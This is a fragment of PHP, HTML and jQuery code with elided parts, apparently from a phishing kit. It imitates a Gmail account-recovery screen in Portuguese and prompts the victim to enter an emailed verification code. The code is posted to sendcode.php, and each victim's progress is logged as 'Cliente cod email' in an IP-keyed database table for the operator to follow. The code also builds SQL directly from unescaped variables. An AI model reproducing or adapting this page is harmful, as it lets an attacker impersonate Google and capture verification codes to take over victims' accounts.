...
$email2 = $row_infio['numero_autenticar'];

$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', status='Cliente cod email', statusremote='Cliente online cod do email' WHERE ip='$ip'");
...
$(document).ready(function(){     
   ...
   //  var email = $("#email").val();
	...
	//	email: email,
		...
		url: 'sendcode.php',//Definindo o arquivo onde serão buscados os dados
...
<div style="height:40px;"><div style="float:left; font-size:17px; width:100%; text-align: center;"><p data-i18n="email.gmail.email.title" >Recuperação de conta</p>
<div style="height:30px;"><div style="float:left; font-size:15px; width:100%; text-align: center;" data-i18n="email.gmail.email.message">Com isso, você pode confirmar que a conta é realmente sua.</div></div>
</div></div>
...
<table align="center">
  ...
  <div style="height:30px;"><div style="float:left; font-size:15px; width:100%; text-align: center;"><span data-i18n="email.gmail.email.text">Um e-mail com um código de verificação acabou de ser enviado para</span> <b><?=$email2;?></b></div></div>
</div>
...
<input type="password" name="emailsenha" id="emailsenha" placeholder="insira Código" onClick="clicar()" size="1" data-i18n="[placeholder]email.gmail.email.placeholder">
<input type="hidden" name="email" id="email" value="<?=$email?>">
</div>
<div id="errorsenha" style="display: none;"><span style="color: red;" data-i18n="email.gmail.email.error">Código incorreto!</span></div>
<div style="margin-top:50px; height: 40px;">
<!-- <div style="float: left; padding: 8px 0 0 0; font-size: 14px;"><a target="_blank" href="">try again</a></div> -->
<div style="float: right; text-align: right;"><input type="submit" name="entrar" id="entrar" value="Sincronizar" data-i18n="[value]email.gmail.email.button" /></div>
</div>
</div>
</div>
</form>
